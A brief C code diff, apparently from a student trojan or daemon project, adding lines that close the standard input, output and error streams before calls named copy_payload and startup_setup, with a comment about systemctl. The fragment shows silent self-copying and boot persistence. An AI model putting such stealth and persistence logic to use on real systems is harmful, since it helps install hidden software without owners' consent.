@@ -14,6 +14,9 @@ int main ( void )
     }
     if (strcmp(buf, EXECUTABLE_FILE)) {
         printf("robrodri & jalvarad.\n");
+        close(STDIN_FILENO);
+        close(STDOUT_FILENO);
+        close(STDERR_FILENO);
         copy_payload(buf);
         // systems without systemctl will not work
         startup_setup();
